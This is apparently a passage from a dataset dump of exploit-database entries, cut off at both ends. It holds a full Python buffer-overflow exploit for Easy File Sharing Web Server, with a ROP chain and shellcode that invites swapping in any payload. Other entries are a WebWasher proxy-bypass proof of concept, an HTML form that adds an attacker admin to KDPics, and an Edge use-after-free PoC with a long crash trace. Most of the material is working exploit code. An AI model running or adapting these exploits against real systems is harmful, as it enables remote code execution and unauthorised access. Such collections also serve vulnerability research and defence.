EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll]        0x1001b4f6,  # POP ECX # RETN [ImageLoad.dll]        0x61c73281,  # &Writable location [sqlite3.dll]       0x100194b3,  # POP EDI # RETN [ImageLoad.dll]        0x1001a858,  # RETN (ROP NOP) [ImageLoad.dll]       0x10015442,  # POP EAX # RETN [ImageLoad.dll]        0x90909090,  # nop       0x100240c2,  # PUSHAD # RETN [ImageLoad.dll]      ]     return ''.join(struct.pack('<I', _) for _ in rop_gadgets)  	 # Check command line args  if len(sys.argv) <= 1:     print ""Usage: python poc.py [host] [port]""     exit()  host = sys.argv[1]     port = int(sys.argv[2])   # Offsets rop_offset = 2455 max_size = 5000 seh_offset = 4059 eax_offset = 4183   # move ESP out of the way so the shellcode doesn't corrupt itself during execution # metasm > add esp,-1500 shellcode =  ""\x81\xc4\x24\xfa\xff\xff""  # Just as a PoC, spawn calc.exe. Replace with any other shellcode you want # (maximum size of shellcode allowed: 1260 bytes) # # msfvenom -p windows/exec CMD=calc.exe -b '\x00\x3b' -f python # Payload size: 220 bytes shellcode += ""\xbb\xde\x37\x73\xe9\xdb\xdf\xd9\x74\x24\xf4\x58\x31"" shellcode += ""\xc9\xb1\x31\x31\x58\x13\x83\xe8\xfc\x03\x58\xd1\xd5"" shellcode += ""\x86\x15\x05\x9b\x69\xe6\xd5\xfc\xe0\x03\xe4\x3c\x96"" shellcode += ""\x40\x56\x8d\xdc\x05\x5a\x66\xb0\xbd\xe9\x0a\x1d\xb1"" shellcode += ""\x5a\xa0\x7b\xfc\x5b\x99\xb8\x9f\xdf\xe0\xec\x7f\xde"" shellcode += ""\x2a\xe1\x7e\x27\x56\x08\xd2\xf0\x1c\xbf\xc3\x75\x68"" shellcode += ""\x7c\x6f\xc5\x7c\x04\x8c\x9d\x7f\x25\x03\x96\xd9\xe5"" shellcode += ""\xa5\x7b\x52\xac\xbd\x98\x5f\x66\x35\x6a\x2b\x79\x9f"" shellcode += ""\xa3\xd4\xd6\xde\x0c\x27\x26\x26\xaa\xd8\x5d\x5e\xc9"" shellcode += ""\x65\x66\xa5\xb0\xb1\xe3\x3e\x12\x31\x53\x9b\xa3\x96"" shellcode += ""\x02\x68\xaf\x53\x40\x36\xb3\x62\x85\x4c\xcf\xef\x28"" shellcode += ""\x83\x46\xab\x0e\x07\x03\x6f\x2e\x1e\xe9\xde\x4f\x40"" shellcode += ""\x52\xbe\xf5\x0a\x7e\xab\x87\x50\x14\x2a\x15\xef\x5a"" shellcode += ""\x2c\x25\xf0\xca\x45\x14\x7b\x85\x12\xa9\xae\xe2\xed"" shellcode += ""\xe3\xf3\x42\x66\xaa\x61\xd7\xeb\x4d\x5c\x1b\x12\xce"" shellcode += ""\x55\xe3\xe1\xce\x1f\xe6\xae\x48\xf3\x9a\xbf\x3c\xf3"" shellcode += ""\x09\xbf\x14\x90\xcc\x53\xf4\x79\x6b\xd4\x9f\x85""   buffer = ""A"" * rop_offset						# padding buffer += create_rop_chain() buffer += shellcode buffer += ""A"" * (seh_offset - len(buffer))		# padding buffer += ""BBBB""								# overwrite nSEH pointer buffer += struct.pack(""<I"", 0x1002280a)			# overwrite SEH record with stack pivot (ADD ESP,1004 # RETN [ImageLoad.dll]) buffer += ""A"" * (eax_offset - len(buffer))		# padding buffer += struct.pack(""<I"", 0xffffffff)			# overwrite EAX to always trigger an exception buffer += ""A"" * (max_size - len(buffer))		# padding   httpreq = ( ""GET /changeuser.ghp HTTP/1.1\r\n"" ""User-Agent: Mozilla/4.0\r\n"" ""Host:"" + host + "":"" + str(port) + ""\r\n"" ""Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"" ""Accept-Language: en-us\r\n"" ""Accept-Encoding: gzip, deflate\r\n"" ""Referer: http://"" + host + ""/\r\n"" ""Cookie: SESSIONID=6771; UserID="" + buffer + ""; PassWD=;\r\n"" ""Conection: Keep-Alive\r\n\r\n"" )  # Send payload to the server s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.send(httpreq) s.close()",Easy File Sharing Web Server,1
25066,"WebWasher Classic 2.2/2.3 - HTTP CONNECT Unauthorized Access source: https://www.securityfocus.com/bid/12394/info  It is reported that WebWasher Classic is prone to a weakness that may allow remote attackers to connect to arbitrary ports on a vulnerable computer.  This weakness may be combined with other attacks to exploit latent vulnerabilities. An attacker can bypass access controls implemented by the application through this attack.  WebWasher Classic 3.3 and 2.2.1 are reported prone to this weakness. Other versions may be affected as well.   The following proof of concept is available: 1) Start a netcat listener on the WebWasher system: netcat -L -p 99 -s 127.0.0.1 < hallo.txt 2) Connect to the WebWasher proxy port (default 8080/tcp) 3) Enter command ""CONNECT 127.0.0.1:99 HTTP/1.0""  As a result, content of hallo.txt will appear.",WebWasher Classic,1
33723,"KDPics 1.18 - '/admin/index.php' Authentication Bypass source: https://www.securityfocus.com/bid/38603/info  KDPics is prone to a vulnerability that lets an attacker add an administrative user because it fails to adequately secure access to administrative functionality.  This may allow the attacker to compromise the application and the computer; other attacks are also possible.  KDPics 1.18 is vulnerable; other versions may also be affected.    <html> <title>G�n�r� par KDPics v1.18 Remote Add Admin</title>   <body link=""#00FF00"" text=""#008000"" bgcolor=""#000000"">   <form method=""POST"" action=""http://www.example.com/kdpics/admin/index.php3?page=options&categorie=""> <input type=""hidden"" name=""type"" value=""add""> <table border=""1"" cellpadding=""4"" style=""border-collapse: collapse"" width=""100%"" bordercolor=""#808080""> <tr> <td class=""top""> <p align=""center""><b>User & Pass :Snakespc</b></p> <p align=""center""><b><font face=""Comic Sans MS""> <a href=""http://www.example.com//index.php?act=idx"" style=""text-decoration: none""> <font color=""#00FF00"">[�]Founder:[ Snakespc Email:super_cristal@hotmail.com - Site:sec-war.com/cc> ]</p> [�] Greetz to:[ sec-warTeaM, PrEdAtOr ,alnjm33 >>> All My Mamber >> sec-war.com/cc ]</p>[�] Dork:""G�n�r� par KDPics v1.18""</font></a></font></b></p> <p align=""center""><b>Username:</b></td> </tr> <tr> <td height=""1""> <p align=""center""><input type=""text"" name=""adminuser"" size=""30"" value=""Snakespc""></td> </tr> <tr> <td class=""top""> <p align=""center""><b>Password:</b></td> </tr> <tr>   <td height=""22""> <p align=""center""> <input type=""password"" name=""adminpass"" size=""30"" value=""Snakespc""></td> </tr> <tr> <td align=""right""> <p align=""center""> <input type=""submit"" value=""Add User >>"" style=""font-weight: 700""></td> </tr> </form> </table> </html>",KDPics,1
39824,"Adobe Flash - JXR Processing Out-of-Bounds Read Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=791  There is an out-of-bounds read in JXR processing. This issue is probably not exploitable, but could be used an an information leak.  To reproduce the issue, load the attach file '8' using LoadImage.swf as follows:  LoadImage.swf?img=8   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39824.zip",Adobe Flash,1
42445,"Microsoft Edge 38.14393.1066.0 - 'textarea.defaultValue' Memory Disclosure <!-- Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1255  There is a use-after free vulnerability in Microsoft Edge that can lead to memory disclosure. The vulnerability has been confirmed on Windows 10 Enterprise 64-bit (OS version 1607, OS build 14393.1198), Microsoft Edge 38.14393.1066.0, Microsoft EdgeHTML 14.14393.  PoC:  ========================================== -->  <!-- saved from url=(0014)about:internet --> <script> var n = 0; function go() {   document.addEventListener(""DOMNodeRemoved"", eventhandler);   eventhandler(); } function eventhandler() {   n++; if(n==5) return; //prevent going into an infinite recursion   t.defaultValue = ""aaaaaaaaaaaaaaaaaaaa"";   f.reset(); } </script> <body onload=go()> <form id=""f""> <textarea id=""t"">aaa</textarea>  <!-- =========================================  This seems to be the same bug as https://bugs.chromium.org/p/project-zero/issues/detail?id=1076 only that one is in IE and this one is in Edge.  I don't have symbols for the latest Edge after May update, so crash log doesn't make much sense but here it is anyway:  =========================================  (1618.1258): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\WINDOWS\SYSTEM32\edgehtml.dll -  edgehtml!Ordinal125+0x6446c: 00007ffe`843d615c 6641393e        cmp     word ptr [r14],di ds:000001fa`3389cfd4=????  0:013> !heap -p -a 000001fa`3389cfd4     address 000001fa3389cfd4 found in     _DPH_HEAP_ROOT @ 1f20b961000     in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)                                 1fa33116138:      1fa3389c000             2000     00007ffe9fb1b90b ntdll!RtlDebugReAllocateHeap+0x0000000000000047     00007ffe9fadcbfe ntdll!RtlpReAllocateHeapInternal+0x000000000008729e     00007ffe9fa55941 ntdll!RtlReAllocateHeap+0x0000000000000031     00007ffe845cc2fa edgehtml!CreateWebDriverAdapter+0x00000000000504ba     00007ffe845cbd74 edgehtml!CreateWebDriverAdapter+0x000000000004ff34     00007ffe8462fbb8 edgehtml!Ordinal107+0x0000000000056a48     00007ffe84d05143 edgehtml!Ordinal106+0x0000000000018e63     00007ffe845ab544 edgehtml!CreateWebDriverAdapter+0x000000000002f704     00007ffe846b0747 edgehtml!Ordinal107+0x00000000000d75d7     00007ffe84ae5c8f edgehtml!ClearPhishingFilterData+0x00000000000beeaf     00007ffe84792bb5 edgehtml!DllEnumClassObjects+0x0000000000043245     00007ffe83c41227 chakra!DllGetClassObject+0x0000000000001d97     00007ffe83c7a3d7 chakra!MemProtectHeapUnrootAndZero+0x00000000000038e7     00007ffe83aef541 chakra!JsProjectWinRTNamespace+0x0000000000046621     000001fa1cf7057e +0x000001fa1cf7057e  0:013> r rax=0000000000000000 rbx=000001fa2d058a40 rcx=000001f212910000 rdx=0000004d44824f5c rsi=0000000000000000 rdi=0000000000000000 rip=00007ffe843d615c rsp=0000004d44824f10 rbp=0000004d44825010  r8=00000000ffffffff  r9=000001f212910000 r10=00007ffe85156fd0 r11=000001f212841a90 r12=0000000000000000 r13=0000000000000014 r14=000001fa3389cfd4 r15=000001f2128e8840 iopl=0         nv up ei pl zr na po nc cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246 edgehtml!Ordinal125+0x6446c: 00007ffe`843d615c 6641393e        cmp     word ptr [r14],di ds:000001fa`3389cfd4=????  0:013> k  # Child-SP          RetAddr           Call Site 00 0000004d`44824f10 00007ffe`844bc561 edgehtml!Ordinal125+0x6446c 01 0000004d`44826190 00007ffe`8459a535 edgehtml!Ordinal105+0x13631 02 0000004d`448261e0 00007ffe`84d0527e edgehtml!CreateWebDriverAdapter+0x1e6f5 03 0000004d`44826340 00007ffe`84d03e81 edgehtml!Ordinal106+0x18f9e 04 0000004d`448263c0 00007ffe`84447753 edgehtml!Ordinal106+0x17ba1 05 0000004d`448263f0 00007ffe`8453341c edgehtml!Ordinal125+0xd5a63 06 0000004d`448264e0 00007ffe`847afc55 edgehtml!GetWebPlatformObject+0xbb4c *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\WINDOWS\SYSTEM32\chakra.dll -  07 0000004d`44826520 00007ffe`83c41227 edgehtml!DllEnumClassObjects+0x602e5 08 0000004d`44826550 000001fa`1cf70641 chakra!DllGetClassObject+0x1d97 09 0000004d`44826630 00007ffe`83cf90a3 0x000001fa`1cf70641 0a 0000004d`448266c0 00007ffe`83c68203 chakra!MemProtectHeapReportHeapSize+0x10013 0b 0000004d`44826710 00007ffe`83c9cf7c chakra!DllGetClassObject+0x28d73 0c 0000004d`44826770 00007ffe`83c9c546 chakra!MemProtectHeapUnrootAndZero+0x2648c 0d 0000004d`44826860 00007ffe`83cde729 chakra!MemProtectHeapUnrootAndZero+0x25a56 0e 0000004d`448268d0 00007ffe`83ca29e1 chakra!JsVarToExtension+0xa3e9 0f 0000004d`44826970 00007ffe`83c9e59c chakra!MemProtectHeapUnrootAndZero+0x2bef1 10 0000004d`44826a00 00007ffe`84650c4d chakra!MemProtectHeapUnrootAndZero+0x27aac 11 0000004d`44826aa0 00007ffe`84650b98 edgehtml!Ordinal107+0x77add 12 0000004d`44826af0 00007ffe`8458ac07 edgehtml!Ordinal107+0x77a28 13 0000004d`44826b30 00007ffe`8458a9f7 edgehtml!CreateWebDriverAdapter+0xedc7 14 0000004d`44826cb0 00007ffe`8464f59a edgehtml!CreateWebDriverAdapter+0xebb7 15 0000004d`44826d30 00007ffe`844b61e4 edgehtml!Ordinal107+0x7642a 16 0000004d`44826e90 00007ffe`845a0e21 edgehtml!Ordinal105+0xd2b4 17 0000004d`44826ed0 00007ffe`8505d046 edgehtml!CreateWebDriverAdapter+0x24fe1 18 0000004d`448271a0 00007ffe`847edaa2 edgehtml!Ordinal138+0x32876 19 0000004d`448271f0 00007ffe`845ad572 edgehtml!DllEnumClassObjects+0x9e132 1a 0000004d`44827360 00007ffe`845a7609 edgehtml!CreateWebDriverAdapter+0x31732 1b 0000004d`448273a0 00007ffe`8459a29d edgehtml!CreateWebDriverAdapter+0x2b7c9 1c 0000004d`448274b0 00007ffe`84d0527e edgehtml!CreateWebDriverAdapter+0x1e45d 1d 0000004d`44827610 00007ffe`84d0515a edgehtml!Ordinal106+0x18f9e 1e 0000004d`44827690 00007ffe`845ab544 edgehtml!Ordinal106+0x18e7a 1f 0000004d`448276c0 00007ffe`846b0747 edgehtml!CreateWebDriverAdapter+0x2f704 20 0000004d`448277c0 00007ffe`84ae5c8f edgehtml!Ordinal107+0xd75d7 21 0000004d`44827800 00007ffe`84792bb5 edgehtml!ClearPhishingFilterData+0xbeeaf 22 0000004d`44827840 00007ffe`83c41227 edgehtml!DllEnumClassObjects+0x43245 23 0000004d`44827870 00007ffe`83c7a3d7 chakra!DllGetClassObject+0x1d97 24 0000004d`44827950 00007ffe`83aef541 chakra!MemProtectHeapUnrootAndZero+0x38e7 25 0000004d`44827a30 000001fa`1cf7057e chakra!JsProjectWinRTNamespace+0x46621 26 0000004d`44827af0 00007ffe`83cf90a3 0x000001fa`1cf7057e 27 0000004d`44827b80 00007ffe`83c68203 chakra!MemProtectHeapReportHeapSize+0x10013 28 0000004d`44827bd0 00007ffe`83c9cf7c chakra!DllGetClassObject+0x28d73 29 0000004d`44827c30 00007ffe`83c9c546 chakra!MemProtectHeapUnrootAndZero+0x2648c 2a 0000004d`44827d20 00007ffe`83cde729 chakra!MemProtectHeapUnrootAndZero+0x25a56 2b 0000004d`44827d90 00007ffe`83ca29e1 chakra!JsVarToExtension+0xa3e9 2c 0000004d`44827e30 00007ffe`83c9e59c chakra!MemProtectHeapUnrootAndZero+0x2bef1 2d 0000004d`44827ec0 00007ffe`84650c4d chakra!MemProtectHeapUnrootAndZero+0x27aac 2e 0000004d`44827f60 00007ffe`84650b98 edgehtml!Ordinal107+0x77add 2f 0000004d`44827fb0 00007ffe`8458ac07 edgehtml!Ordinal107+0x77a28 30 0000004d`44827ff0 00007ffe`8458a9f7 edgehtml!CreateWebDriverAdapter+0xedc7 31 0000004d`44828170 00007ffe`8464f59a edgehtml!CreateWebDriverAdapter+0xebb7 32 0000004d`448281f0 00007ffe`844b61e4 edgehtml!Ordinal107+0x7642a 33 0000004d`44828350 00007ffe`845a0e21 edgehtml!Ordinal105+0xd2b4 34 0000004d`44828390 00007ffe`8505d046 edgehtml!CreateWebDriverAdapter+0x24fe1 35 0000004d`44828660 00007ffe`847edaa2 edgehtml!Ordinal138+0x32876 36 0000004d`448286b0 00007ffe`845ad572 edgehtml!DllEnumClassObjects+0x9e132 37 0000004d`44828820 00007ffe`845a7609 edgehtml!CreateWebDriverAdapter+0x31732 38 0000004d`44828860 00007ffe`8459a29d edgehtml!CreateWebDriverAdapter+0x2b7c9 39 0000004d`44828970 00007ffe`84d0527e edgehtml!CreateWebDriverAdapter+0x1e45d 3a 0000004d`44828ad0 00007ffe`84d0515a edgehtml!Ordinal106+0x18f9e 3b 0000004d`44828b50 00007ffe`845ab544 edgehtml!Ordinal106+0x18e7a 3c 0000004d`44828b80 00007ffe`846b0747 edgehtml!CreateWebDriverAdapter+0x2f704 3d 0000004d`44828c80 00007ffe`84ae5c8f edgehtml!Ordinal107+0xd75d7 3e 0000004d`44828cc0 00007ffe`84792bb5 edgehtml!ClearPhishingFilterData+0xbeeaf 3f 0000004d`44828d00 00007ffe`83c41227 edgehtml!DllEnumClassObjects+0x43245 40 0000004d`44828d30 00007ffe`83c7a3d7 chakra!DllGetClassObject+0x1d97 41 0000004d`44828e10 00007ffe`83aef541 chakra!MemProtectHeapUnrootAndZero+0x38e7 42 0000004d`44828ef0 000001fa`1cf7057e chakra!JsProjectWinRTNamespace+0x46621 43 0000004d`44828fb0 00007ffe`83cf90a3 0x000001fa`1cf7057e 44 0000004d`44829040 00007ffe`83c68203 chakra!MemProtectHeapReportHeapSize+0x10013 45 0000004d`44829090 00007ffe`83c9cf7c chakra!DllGetClassObject+0x28d73 46 0000004d`448290f0 00007ffe`83c9c546 chakra!MemProtectHeapUnrootAndZero+0x2648c 47 0000004d`448291e0 00007ffe`83cde729 chakra!MemProtectHeapUnrootAndZero+0x25a56 48 0000004d`44829250 00007ffe`83ca29e1 chakra!JsVarToExtension+0xa3e9 49 0000004d`448292f0 00007ffe`83c9e59c chakra!MemProtectHeapUnrootAndZero+0x2bef1 4a 0000004d`44829380 00007ffe`84650c4d chakra!MemProtectHeapUnrootAndZero+0x27aac 4b 0000004d`44829420 00007ffe`84650b98 edgehtml!Ordinal107+0x77add 4c 0000004d`44829470 00007ffe`8458ac07 edgehtml!Ordinal107+0x77a28 4d 0000004d`448294b0 00007ffe`8458a9f7 edgehtml!CreateWebDriverAdapter+0xedc7 4e 0000004d`44829630 00007ffe`8464f59a edgehtml!CreateWebDriverAdapter+0xebb7 4f 0000004d`448296b0 00007ffe`844b61e4 edgehtml!Ordinal107+0x7642a 50 0000004d`44829810 00007ffe`845a0e21 edgehtml!Ordinal105+0xd2b4 51 0000004d`44829850 00007ffe`8505d046 edgehtml!CreateWebDriverAdapter+0x24fe1 52 0000004d`44829b20 00007ffe`847edaa2 edgehtml!Ordinal138+0x32876 53 0000004d`44829b70 00007ffe`845ad572 edgehtml!DllEnumClassObjects+0x9e132 54 0000004d`44829ce0 00007ffe`845a7609 edgehtml!CreateWebDriverAdapter+0x31732 55 0000004d`44829d20 00007ffe`8459a29d edgehtml!CreateWebDriverAdapter+0x2b7c9 56 0000004d`44829e30 00007ffe`84d0527e edgehtml!CreateWebDriverAdapter+0x1e45d 57 0000004d`44829f90 00007ffe`84d0515a edgehtml!Ordinal106+0x18f9e 58 0000004d`4482a010 00007ffe`845ab544 edgehtml!Ordinal106+0x18e7a 59 0000004d`4482a040 00007ffe`846b0747 edgehtml!CreateWebDriverAdapter+0x2f704 5a 0000004d`4482a140 00007ffe`84ae5c8f edgehtml!Ordinal107+0xd75d7 5b 0000004d`4482a180 00007ffe`84792bb5 edgehtml!ClearPhishingFilterData+0xbeeaf 5c 0000004d`4482a1c0 00007ffe`83c41227 edgehtml!DllEnumClassObjects+0x43245 5d 0000004d`4482a1f0 00007ffe`83c7a3d7 chakra!DllGetClassObject+0x1d97 5e 0000004d`4482a2d0 00007ffe`83aef541 chakra!MemProtectHeapUnrootAndZero+0x38e7 5f 0000004d`4482a3b0 000001fa`1cf7057e chakra!JsProjectWinRTNamespace+0x46621 60 0000004d`4482a470 00007ffe`83cf90a3 0x000001fa`1cf7057e 61 0000004d`4482a500 00007ffe`83c68203 chakra!MemProtectHeapReportHeapSize+0x10013 62 0000004d`4482a550 00007ffe`83c9cf7c chakra!DllGetClassObject+0x28d73 63 0000004d`4482a5b0 00007ffe`83c9c546 chakra!MemProtectHeapUnrootAndZero+0x2648c 64 0000004d`4482a6a0 00007ffe`83cde729 chakra!MemProtectHeapUnrootAndZero+0x25a56 65 0000004d`4482a710 00007ffe`83ca29e1 chakra!JsVarToExtension+0xa3e9 66 0000004d`4482a7b0 00007ffe`83c9e59c chakra!MemProtectHeapUnrootAndZero+0x2bef1 67 0000004d`4482a840 00007ffe`84650c4d chakra!MemProtectHeapUnrootAndZero+0x27aac 68 0000004d`4482a8e0 00007ffe`84650b98 edgehtml!Ordinal107+0x77add 69 0000004d`4482a930 00007ffe`8458ac07 edgehtml!Ordinal107+0x77a28 6a 0000004d`4482a970 00007ffe`8458a9f7 edgehtml!CreateWebDriverAdapter+0xedc7 6b 0000004d`4482aaf0 00007ffe`8464f59a edgehtml!CreateWebDriverAdapter+0xebb7 6c 0000004d`4482ab70 00007ffe`844b61e4 edgehtml!Ordinal107+0x7642a 6d 0000004d`4482acd0 00007ffe`845a0e21 edgehtml!Ordinal105+0xd2b4 6e 0000004d`4482ad10 00007ffe`8505d046 edgehtml!CreateWebDriverAdapter+0x24fe1 6f 0000004d`4482afe0 00007ffe`847edaa2 edgehtml!Ordinal138+0x32876 70 0000004d`4482b030 00007ffe`845ad572 edgehtml!DllEnumClassObjects+0x9e132 71 0000004d`4482b1a0 00007ffe`845a7609 edgehtml!CreateWebDriverAdapter+0x31732 72 0000004d`4482b1e0 00007ffe`8459a29d edgehtml!CreateWebDriverAdapter+0x2b7c9 73 0000004d`4482b2f0 00007ffe`84d0527e edgehtml!CreateWebDriverAdapter+0x1e45d 74 0000004d`4482b450 00007ffe`84d0515a edgehtml!Ordinal106+0x18f9e 75 0000004d`4482b4d0 00007ffe`845ab544 edgehtml!Ordinal106+0x18e7a 76 0000004d`4482b500 00007ffe`846b0747 edgehtml!CreateWebDriverAdapter+0x2f704 77 0000004d`4482b600 00007ffe`84ae5c8f edgehtml!Ordinal107+0xd75d7 78 0000004d`4482b640 00007ffe`84792bb5 edgehtml!ClearPhishingFilterData+0xbeeaf 79 0000004d`4482b680 00007ffe`83c41227 edgehtml!DllEnumClassObjects+0x43245 7a 0000004d`4482b6b0 00007ffe`83c7a3d7 chakra!DllGetClassObject+0x1d97 7b 0000004d`4482b790 00007ffe`83aef541 chakra!MemProtectHeapUnrootAndZero+0x38e7 7c 0000004d`4482b870 000001fa`1cf7057e chakra!JsProjectWinRTNamespace+0x46621 7d 0000004d`4482b930 00007ffe`83cf90a3 0x000001fa`1cf7057e 7e 0000004d`4482b9c0 00007ffe`83c68203 chakra!MemProtectHeapReportHeapSize+0x10013 7f 0000004d`4482ba10 00007ffe`83c9cf7c chakra!DllGetClassObject+0x28d73 80 0000004d`4482ba70 00007ffe`83c9c546 chakra!MemProtectHeapUnrootAndZero+0x2648c 81 0000004d`4482bb60 00007ffe`83cde729 chakra!MemProtectHeapUnrootAndZero+0x25a56 82 0000004d`4482bbd0 00007ffe`83ca29e1 chakra!JsVarToExtension+0xa3e9 83 0000004d`4482bc70 00007ffe`83c9e59c chakra!MemProtectHeapUnrootAndZero+0x2bef1 84 0000004d`4482bd00 00007ffe`84650c4d chakra!MemProtectHeapUnrootAndZero+0x27aac 85 0000004d`4482bda0 00007ffe`84650b98 edgehtml!Ordinal107+0x77add 86 0000004d`4482bdf0 00007ffe`8458ac07 edgehtml!Ordinal107+0x77a28 87 0000004d`4482be30 00007ffe`8458a9f7 edgehtml!CreateWebDriverAdapter+0xedc7 88 0000004d`4482bfb0 00007ffe`8464f59a edgehtml!CreateWebDriverAdapter+0xebb7 89 0000004d`4482c030 00007ffe`844b61e4 edgehtml!Ordinal107+0x7642a 8a 0000004d`4482c190 00007ffe`845a0e21 edgehtml!Ordinal105+0xd2b4 8b 0000004d`4482c1d0 00007ffe`8505d046 edgehtml!CreateWebDriverAdapter+0x24fe1 8c 0000004d`4482c4a0 00007ffe`847edaa2 edgehtml!Ordinal138+0x32876 8d 0000004d`4482c4f0 00007ffe`845ad572 edgehtml!DllEnumClassObjects+0x9e132 8e 0000004d`4482c660 00007ffe`845a7609 edgehtml!CreateWebDriverAdapter+0x31732 8f 0000004d`4482c6a0 00007ffe`8459a29d edgehtml!CreateWebDriverAdapter+0x2b7c9 90 0000004d`4482c7b0 00007ffe`84d0527e edgehtml!CreateWebDriverAdapter+0x1e45d 91 0000004d`4482c910 00007ffe`84d0515a edgehtml!Ordinal106+0x18f9e 92 0000004d`4482c990 00007ffe`845ab544 edgehtml!Ordinal106+0x18e7a 93 0000004d`4482c9c0 00007ffe`846b0747 edgehtml!CreateWebDriverAdapter+0x2f704 94 0000004d`4482cac0 00007ffe`84ae5c8f edgehtml!Ordinal107+0xd75d7 95 0000004d`4482cb00 00007ffe`84792bb5 edgehtml!ClearPhishingFilterData+0xbeeaf 96 0000004d`4482cb40 00007ffe`83c41227 edgehtml!DllEnumClassObjects+0x43245 97 0000004d`4482cb70 00007ffe`83c7a3d7 chakra!DllGetClassObject+0x1d97 98 0000004d`4482cc50 00007ffe`83aef541 chakra!MemProtectHeapUnrootAndZero+0x38e7 99 0000004d`4482cd30 000001fa`1cf7057e chakra!JsProjectWinRTNamespace+0x46621 9a 0000004d`4482cdf0 00007ffe`83cf90a3 0x000001fa`1cf7057e 9b 0000004d`4482ce80 00007ffe`83c68203 chakra!MemProtectHeapReportHeapSize+0x10013 9c 0000004d`4482ced0 00007ffe`83c9cf7c chakra!DllGetClassObject+0x28d73 9d 0000004d`4482cf30 00007ffe`83c9c546 chakra!MemProtectHeapUnrootAndZero+0x2648c 9e 0000004d`4482d020 00007ffe`83cde729 chakra!MemProtectHeapUnrootAndZero+0x25a56 9f 0000004d`4482d090 00007ffe`83ca29e1 chakra!JsVarToExtension+0xa3e9 a0 0000004d`4482d130 00007ffe`83c9e59c chakra!MemProtectHeapUnrootAndZero+0x2bef1 a1 0000004d`4482d1c0 00007ffe`84650c4d chakra!MemProtectHeapUnrootAndZero+0x27aac a2 0000004d`4482d260 00007ffe`84650b98 edgehtml!Ordinal107+0x77add a3 0000004d`4482d2b0 00007ffe`8458ac07 edgehtml!Ordinal107+0x77a28 a4 0000004d`4482d2f0 00007ffe`8458a9f7 edgehtml!CreateWebDriverAdapter+0xedc7 a5 0000004d`4482d470 00007ffe`8464f59a edgehtml!CreateWebDriverAdapter+0xebb7 a6 0000004d`4482d4f0 00007ffe`844b61e4 edgehtml!Ordinal107+0x7642a a7 0000004d`4482d650 00007ffe`845a0e21 edgehtml!Ordinal105+0xd2b4 a8 0000004d`4482d690 00007ffe`8505d046 edgehtml!CreateWebDriverAdapter+0x24fe1 a9 0000004d`4482d960 00007ffe`847edaa2 edgehtml!Ordinal138+0x32876 aa 0000004d`4482d9b0 00007ffe`845ad572 edgehtml!DllEnumClassObjects+0x9e132 ab 0000004d`4482db20 00007ffe`845a7609 edgehtml!CreateWebDriverAdapter+0x31732 ac 0000004d`4482db60 00007ffe`8459a29d edgehtml!CreateWebDriverAdapter+0x2b7c9 ad 0000004d`4482dc70 00007ffe`84d0527e edgehtml!CreateWebDriverAdapter+0x1e45d ae 0000004d`4482ddd0 00007ffe`84d0515a edgehtml!Ordinal106+0x18f9e af 0000004d`4482de50 00007ffe`845ab544 edgehtml!Ordinal106+0x18e7a b0 0000004d`4482de80 00007ffe`846b0747 edgehtml!CreateWebDriverAdapter+0x2f704 b1 0000004d`4482df80 00007ffe`84ae5c8f edgehtml!Ordinal107+0xd75d7 b2 0000004d`4482dfc0 00007ffe`84792bb5 edgehtml!ClearPhishingFilterData+0xbeeaf b3 0000004d`4482e000 00007ffe`83c41227 edgehtml!DllEnumClassObjects+0x43245 b4 0000004d`4482e030 00007ffe`83c7a3d7 chakra!DllGetClassObject+0x1d97 b5 0000004d`4482e110 00007ffe`83aef541 chakra!MemProtectHeapUnrootAndZero+0x38e7 b6 0000004d`4482e1f0 000001fa`1cf7057e chakra!JsProjectWinRTNamespace+0x46621 b7 0000004d`4482e2b0 00007ffe`83cf90a3 0x000001fa`1cf7057e b8 0000004d`4482e340 00007ffe`83c68203 chakra!MemProtectHeapReportHeapSize+0x10013 b9 0000004d`4482e390 00007ffe`83c9cf7c chakra!DllGetClassObject+0x28d73 ba 0000004d`4482e3f0 00007ffe`83c9c546 chakra!MemProtectHeapUnrootAndZero+0x2648c bb 0000004d`4482e4e0 00007ffe`83cde729 chakra!MemProtectHeapUnrootAndZero+0x25a56 bc 0000004d`4482e550 00007ffe`83ca29e1 chakra!JsVarToExtension+0xa3e9 bd 0000004d`4482e5f0 00007ffe`83c9e59c chakra!MemProtectHeapUnrootAndZero+0x2bef1 be 0000004d`4482e680 00007ffe`84650c4d chakra!MemProtectHeapUnrootAndZero+0x27aac bf 0000004d`4482e720 00007ffe`84650b98 edgehtml!Ordinal107+0x77add c0 